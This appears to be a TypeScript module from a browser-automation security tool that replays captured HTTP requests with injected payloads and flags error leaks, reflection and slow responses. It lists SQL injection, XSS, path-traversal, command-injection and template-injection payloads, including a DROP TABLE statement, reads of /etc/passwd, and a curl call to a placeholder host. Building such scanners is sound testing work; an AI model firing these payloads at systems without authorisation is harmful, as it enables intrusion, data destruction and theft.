import type { BrowserContext } from "playwright";
import type { NetworkLogEntry } from "./network-manager.js";
import { replayRequest, type ReplayResult } from "./security-manager.js";

export type PayloadSetName = "sqli" | "xss" | "path-traversal" | "command-injection" | "ssti";

const PAYLOAD_SETS: Record<PayloadSetName, string[]> = {
  sqli: [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    '" OR "1"="1',
    "') OR ('1'='1",
    "1' UNION SELECT NULL--",
    "1' UNION SELECT NULL,NULL--",
    "1; DROP TABLE users--",
    "' AND SLEEP(3)--",
    "'; WAITFOR DELAY '0:0:3'--",
    "admin'--",
    "' OR 1=1#",
  ],
  xss: [
    "<script>alert('dvbrw-fuzz')</script>",
    "<svg/onload=alert('dvbrw-fuzz')>",
    "<img src=x onerror=alert('dvbrw-fuzz')>",
    "javascript:alert('dvbrw-fuzz')",
    "\"><script>alert('dvbrw-fuzz')</script>",
    "'><svg/onload=alert(1)>",
    "<iframe src=\"javascript:alert('dvbrw-fuzz')\"></iframe>",
    "<body onload=alert('dvbrw-fuzz')>",
  ],
  "path-traversal": [
    "../../../../etc/passwd",
    "..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "/etc/passwd%00",
    "file:///etc/passwd",
  ],
  "command-injection": [
    "; ls -la",
    "| ls -la",
    "& dir",
    "`id`",
    "$(id)",
    "; sleep 3",
    "| sleep 3",
    "&& sleep 3",
    "; cat /etc/passwd",
    "$(curl dvbrw-fuzz.example.com)",
  ],
  ssti: [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "#{7*7}",
    "{{config}}",
    "${{7*7}}",
    "{{''.__class__.__mro__[1].__subclasses__()}}",
  ],
};

export interface FuzzConfig {
  /** Which parameters to fuzz; if omitted, all query params + body params are fuzzed */
  parameters?: string[];
  /** Payload set name, or custom payloads array */
  payloads?: PayloadSetName | string[];
  /** Hard cap on requests to prevent runaway fuzzing */
  maxRequests?: number;
  /** Delay between requests in ms */
  delayMs?: number;
  /** Baseline request duration — anomalies flag responses deviating from this */
  baselineDurationMs?: number;
}

export interface FuzzFinding {
  parameter: string;
  payload: string;
  status: number;
  duration: number;
  anomaly: string;
  snippet: string;
}

export interface FuzzReport {
  baseUrl: string;
  totalRequests: number;
  findings: FuzzFinding[];
  summary: string;
}

const SQL_ERROR_PATTERNS = [
  /sql syntax/i,
  /mysql_fetch/i,
  /ORA-\d{5}/i,
  /PostgreSQL.*ERROR/i,
  /sqlite3\./i,
  /unclosed quotation mark/i,
  /quoted string not properly terminated/i,
  /ODBC.*Driver/i,
];

const ERROR_SIGNATURES = [
  /Stack trace/i,
  /at \w+\.\w+\s*\(/,
  /Traceback \(most recent call last\)/i,
  /Exception in thread/i,
  /Warning:.*on line \d+/i,
];

function pickPayloads(payloads: FuzzConfig["payloads"]): string[] {
  if (!payloads) return PAYLOAD_SETS.sqli;
  if (Array.isArray(payloads)) return payloads;
  return PAYLOAD_SETS[payloads] ?? PAYLOAD_SETS.sqli;
}

function extractParameters(entry: NetworkLogEntry): { location: "query" | "body"; name: string }[] {
  const params: { location: "query" | "body"; name: string }[] = [];

  try {
    const url = new URL(entry.url);
    for (const name of url.searchParams.keys()) {
      params.push({ location: "query", name });
    }
  } catch {
    // ignore parse errors
  }

  if (entry.requestBody) {
    try {
      const json = JSON.parse(entry.requestBody) as Record<string, unknown>;
      if (typeof json === "object" && json !== null) {
        for (const key of Object.keys(json)) {
          params.push({ location: "body", name: key });
        }
      }
    } catch {
      try {
        const body = new URLSearchParams(entry.requestBody);
        for (const name of body.keys()) {
          params.push({ location: "body", name });
        }
      } catch {
        // ignore
      }
    }
  }

  return params;
}

function mutateParam(
  entry: NetworkLogEntry,
  param: { location: "query" | "body"; name: string },
  payload: string
): { url: string; body?: string } {
  if (param.location === "query") {
    const url = new URL(entry.url);
    url.searchParams.set(param.name, payload);
    return { url: url.toString() };
  }

  // body mutation
  let body = entry.requestBody ?? "";
  try {
    const json = JSON.parse(body) as Record<string, unknown>;
    json[param.name] = payload;
    body = JSON.stringify(json);
  } catch {
    const params = new URLSearchParams(body);
    params.set(param.name, payload);
    body = params.toString();
  }

  return { url: entry.url, body };
}

function analyzeResponse(
  result: ReplayResult,
  payloadSet: string,
  baselineDuration?: number
): string | null {
  const notes: string[] = [];

  if (result.status >= 500) {
    notes.push(`server error ${result.status}`);
  }

  for (const pattern of SQL_ERROR_PATTERNS) {
    if (pattern.test(result.body)) {
      notes.push(`sql error pattern: ${pattern.source}`);
      break;
    }
  }

  for (const pattern of ERROR_SIGNATURES) {
    if (pattern.test(result.body)) {
      notes.push("stack trace or exception leaked");
      break;
    }
  }

  if (payloadSet === "xss" && result.body.includes("dvbrw-fuzz")) {
    notes.push("payload reflected unescaped");
  }

  if (baselineDuration !== undefined && result.duration > baselineDuration * 3 && result.duration > 2_000) {
    notes.push(`response took ${result.duration}ms (baseline ${baselineDuration}ms) — possible blind SQLi/DoS`);
  }

  return notes.length > 0 ? notes.join("; ") : null;
}

export async function fuzzRequest(
  context: BrowserContext,
  entry: NetworkLogEntry,
  config: FuzzConfig = {}
): Promise<FuzzReport> {
  const payloads = pickPayloads(config.payloads);
  const maxRequests = Math.max(1, Math.min(config.maxRequests ?? 100, 1_000));
  const delayMs = Math.max(0, config.delayMs ?? 100);
  const payloadSetName = typeof config.payloads === "string" ? config.payloads : "custom";

  const allParams = extractParameters(entry);
  const targetParams = config.parameters
    ? allParams.filter((p) => config.parameters?.includes(p.name))
    : allParams;

  if (targetParams.length === 0) {
    return {
      baseUrl: entry.url,
      totalRequests: 0,
      findings: [],
      summary: "No parameters found to fuzz",
    };
  }

  const findings: FuzzFinding[] = [];
  let totalRequests = 0;

  outer: for (const param of targetParams) {
    for (const payload of payloads) {
      if (totalRequests >= maxRequests) break outer;
      totalRequests++;

      const mutated = mutateParam(entry, param, payload);
      const mutatedEntry: NetworkLogEntry = {
        ...entry,
        url: mutated.url,
        requestBody: mutated.body ?? entry.requestBody,
      };

      try {
        const result = await replayRequest(context, mutatedEntry);
        const anomaly = analyzeResponse(result, payloadSetName, config.baselineDurationMs);
        if (anomaly !== null) {
          findings.push({
            parameter: `${param.location}:${param.name}`,
            payload,
            status: result.status,
            duration: result.duration,
            anomaly,
            snippet: result.body.slice(0, 200),
          });
        }
      } catch (error) {
        findings.push({
          parameter: `${param.location}:${param.name}`,
          payload,
          status: 0,
          duration: 0,
          anomaly: `request error: ${error instanceof Error ? error.message : String(error)}`,
          snippet: "",
        });
      }

      if (delayMs > 0) {
        await new Promise((r) => setTimeout(r, delayMs));
      }
    }
  }

  const summary =
    findings.length === 0
      ? `No anomalies in ${totalRequests} fuzzed requests across ${targetParams.length} parameter(s)`
      : `${findings.length} anomalies in ${totalRequests} requests — ${findings.map((f) => f.parameter).filter((v, i, a) => a.indexOf(v) === i).join(", ")}`;

  return {
    baseUrl: entry.url,
    totalRequests,
    findings,
    summary,
  };
}

export function getPayloads(setName: unknown): string[] {
  const name = String(setName) as PayloadSetName;
  return PAYLOAD_SETS[name] ?? [];
}
